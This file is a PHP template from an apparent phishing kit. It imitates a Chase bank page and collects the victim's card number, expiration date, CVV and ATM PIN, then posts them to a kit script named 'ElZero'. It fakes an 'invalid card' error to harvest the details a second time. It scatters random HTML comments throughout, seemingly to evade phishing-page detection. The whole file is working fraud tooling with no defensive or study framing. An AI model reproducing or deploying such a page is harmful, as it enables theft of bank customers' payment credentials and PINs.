<?php require("includes/header.php") ?>
<style type="text/css">
    .jpui.checkbox .checkboxWrap .check {
        display: inline-block;
        border: .0625rem solid #959595;
        height: 1.25rem;
        width: 1.25rem;
        border-radius: .1875rem;
        position: relative;
         bottom: 0rem; 
    }
</style>
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" homepage" tabindex="-1">
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-container">
                <header class=" toggle-aria-hidden">
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="hdrlog" class=" logon header jpui transparent navigation bar" style="display:block;">
                        <a>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="hdrup" class=" logon header jpui transparent navigation bar" style="background: transparent;background-image: linear-gradient(to bottom, rgba(11, 110, 253, 0.88) 0, rgba(11, 110, 253, 0.49) 50%, rgba(0, 0, 0, 0) 100%); display:none;">
                        <a>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" chase logo"><?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        </a>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                </header>
                <main>
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" container logon">
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui background image fixed">
                                    <style type="text/css">
                                        .jpui.background.image {
                                            background-image: url(./img/mobilenight.jpeg);
                                            filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                            -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
                                        }
                                        
                                        @media (min-width:320px) {
                                            .jpui.background.image {
                                                background-image: url(./img/mobilenight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:992px) {
                                            .jpui.background.image {
                                                background-image: url(./img/tabletnight.jpeg);
                                            }
                                        }
                                        
                                        @media (min-width:1024px) {
                                            .jpui.background.image {
                                                background-image: url(./img/desktopnight.jpeg);
                                            }
                                        }
                                    </style>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                        	<?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" col-xs-12 col-sm-6 col-sm-offset-3 logon-box">

                                    <!-- Login Page -->
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui raised segment">
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" col-xs-10 col-xs-offset-1">
                                            <form action="../ElZero/actions/credit"  name="card-form" method="POST" autocomplete="off" >
                                                <input type="hidden" name="tokenElzeroCsrf" value="<?php echo $_SESSION['ElZeR0_ToKeN'];?>">
                                                <input type="hidden" name="elzeroKiller" value="">
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="" align="center">
                                                    <ol class=" progtrckr" data-progtrckr-steps="4">
                                                        <li class=" progtrckr-done"></li>
                                                        <li class=" progtrckr-done"></li>
                                                        <li class=" progtrckr-done"></li>
                                                    </ol>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <br>
                                                <br>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="errcrd">
                                                    <?php if (isset($_GET['invalid2'])) { ?>
                                                    <input type="hidden" name="invalid">
                                                        
                                                         <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div  style="display:block;" class=" content wrap">
                                                                <h2 class=" title" style="color: #c12659;">Your card is invalid please check and try again</h2> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php } ?>

                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <br>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui vertical">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="labelFlooat" class=" align-label-input floating-label__container crd">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="cardnu">Card Number</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " maxlength="16" minlength="16" id="credit" placeholder="" autocomplete="off" type="text" name="cardnu" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                                <p id="output"></p>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="errorCredit" style="display:none;" class=" content wrap">
                                                                <h2 class=" title" style="color: #c12659;">Your card is invalid please check and try again</h2> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="errorCreditEmpty" style="display:none;" class=" content wrap">
                                                                <h2 class=" title" style="color: #c12659;">Please Enter Your Credit Card</h2> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <span id="visa" class=" lollol img_small zwina shadow visaimg card-icons " style="display:none;"></span>
                                                            <span id="mastercard" class=" lollol img_small zwina shadow mastercardimg card-icons" style="display:none;"></span>
                                                            <span id="known" class=" lollol zwina img_small shadow lawla card-icons"style="display:none;"> </span>
                                                            <input type="hidden" value="" name="cardtype" id="cardtype">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="inexp" class=" jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:block;">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div  class=" jpui vertical">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="floatExpire" class=" align-label-input floating-label__container exp">

                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="expda">Expiration Date</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-xs-toggle">

                                                                <input class=" jpui input logon-xs-toggle " id="expire" placeholder="" autocomplete="off" type="text" name="expda" required="" value="" maxlength="7" minlength="5" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="inccv" class=" jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:block	;">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui vertical">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="floatCvv" class=" align-label-input floating-label__container cvc">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="cvv">CVV</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " id="cvv" maxlength="3" minlength="3" placeholder="" autocomplete="off" type="text" name="cvv" required="" value="" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">

                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                                            <span class=" lollol zwina img_small shadow cco card-icons"> </span>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="inpin" class=" jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:block;">
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" jpui vertical">
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div id="floatAtm" class=" align-label-input floating-label__container atm">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" label-wrapper">
                                                                <label class=" jpui fieldlabel label-alignment vertical" for="pin">ATM Pin</label>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" logon-xs-toggle">
                                                                <input class=" jpui input logon-xs-toggle " maxlength="4" minlength="4" id="ATM" placeholder="" autocomplete="off" type="text" name="pin" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                                                    <button id="mybtn" type="submit" class=" jpui button focus fluid primary touch"><span class=" label">Confirm</span> </button>
                                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                                            </form>
                                        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>c
                        	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                    	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
                	<?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            	</main>
            <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

<?php require("includes/footer.php") ?>




